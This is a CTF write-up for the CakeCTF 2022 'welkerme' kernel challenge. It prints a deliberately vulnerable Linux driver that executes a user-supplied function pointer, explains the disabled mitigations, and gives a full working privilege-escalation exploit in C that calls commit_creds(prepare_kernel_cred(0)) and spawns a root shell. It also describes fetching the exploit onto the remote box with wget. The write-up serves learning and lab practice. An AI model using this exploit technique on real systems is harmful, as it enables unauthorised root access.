---
title: CakeCTF-22 Pwn welkerme
date: 2022-09-04 14:04:00 +0530
categories: [Pwn]
tags: [pwn,Kernel]
pin: true
---

# Challenge Overview
`welkerme` is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge.

## Challenge Files
We are given linux kernel `bzImage`, a `fs` and a vulnerable `driver` installed in it along with its source code. We are also given scripts to launch the kernel in qemu in debug and normal mode

## The Vulnerable Driver
Here's the source code of the vulnerable driver - 
```c
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("welkerme - CakeCTF 2022");

#define DEVICE_NAME "welkerme"
#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

static int module_open(struct inode *inode, struct file *filp) {
  printk("'module_open' called\n");
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  printk("'module_close' called\n");
  return 0;
}

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  long (*code)(void);
  printk("'module_ioctl' called with cmd=0x%08x\n", cmd);

  switch (cmd) {
    case CMD_ECHO:
      printk("CMD_ECHO: arg=0x%016lx\n", arg);
      return arg;

    case CMD_EXEC:
      printk("CMD_EXEC: arg=0x%016lx\n", arg);
      code = (long (*)(void))(arg);
      return code();

    default:
      return -EINVAL;
  }
}

static struct file_operations module_fops = {
  .owner   = THIS_MODULE,
  .open    = module_open,
  .release = module_close,
  .unlocked_ioctl = module_ioctl
};

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME))
    return -EBUSY;

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);
```

We see that the device driver exposes an `ioctl` interface that we can interact with in userspace. The ioctl interface deals with 2 commands one that echos back the argument provided and one that takes the argument provided as function pointer and calls it. The author has also written a helper program that shows how to interact with the device driver -
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

int func(void) {
  return 31337;
}

int main(void) {
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
    perror("/dev/welkerme");
    exit(1);
  }

  ret = ioctl(fd, CMD_ECHO, 12345);
  printf("CMD_ECHO(12345) --> %d\n", ret);

  ret = ioctl(fd, CMD_EXEC, (long)func);
  printf("CMD_EXEC(func) --> %d\n", ret);

  close(fd);
  return 0;
}
```
When we run this we see the output - 
```bash
CMD_ECHO(12345) --> 12345
CMD_EXEC(func) --> 31337
```

## Mitigations
If we look at the scripts thats booting up the kernel in qemu - 
```bash
#!/bin/sh
exec qemu-system-x86_64 \
     -m 64M \
     -nographic \
     -kernel vm/bzImage \
     -append "console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr" \
     -no-reboot \
     -cpu qemu64 \
     -monitor /dev/null \
     -initrd vm/rootfs.cpio \
     -net nic,model=virtio \
     -net user
```
We see that there is no `kaslr` (its almost like ASLR but in kernel space) so symbols like `prepare_kernel_cred` and `commit_creds` have fixed address which we can use. There is no `kpti` so userspace and kernel space page tables are not isolated from each other, there's also no `SMEP` and `SMAP` so userspace pages can be accessed and executed

## Exploit Plan
The challenge can be simply solved by passing an address of a function that calls `commit_creds(prepare_kernel_cred(0))` and returns back to userspace from where we can execute a shell or read the flag from the calling process

## Exploit
I took a lot of code from `lkmidas` post which was linked in the README of the challenge and created this exploit -
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff810726e0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff81072540;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main(void) {
  save_state();
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
    perror("/dev/welkerme");
    exit(1);
  }
  ret = ioctl(fd,CMD_EXEC,(long)escalate_privs);
  close(fd);
  return 0;
}
```
I copied the save_state() function from that post this is called to save some register values which would be needed afterwards to return to userspace. We then open the device and call the ioctl method to call our escalate_privs function which basically calls `commit_creds(prepare_kernel_cred(0))`, I found the address of these functions in the debug build by grepping on `/proc/kallsyms`. We then return to userspace by setting back some registers that we saved already and calling `iretq`, here we also set the returning instruction pointer to a function which exectues the shell for us. Upon executing this exploit we get a shell with root priviliges, as `commit_creds(prepare_kernel_cred(0))` made the  calling process have root priviliges

## Remote
In order to execute this exploit we just need to do another step that is host our exploit on a server or there's another way the author provided which is to host it on `termbin` or `sprunge` which are like pastebin from terminal. Once hosted we can just `wget` them on the remote server and then execute them